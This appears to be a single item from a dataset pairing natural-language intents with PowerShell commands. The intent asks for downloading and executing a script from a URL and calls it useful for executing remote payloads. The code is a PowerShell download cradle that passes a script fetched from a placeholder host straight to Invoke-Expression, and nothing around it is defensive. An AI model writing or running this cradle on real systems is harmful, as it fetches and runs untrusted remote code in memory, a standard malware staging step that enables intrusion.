# Natural language intent:
# Downloading and Executing Scripts from URL, Downloads and executes a PowerShell script from a specified URL. Useful for executing remote payloads.

$url = 'http://example.com/script.ps1'; Invoke-Expression (New-Object Net.WebClient).DownloadString($url)
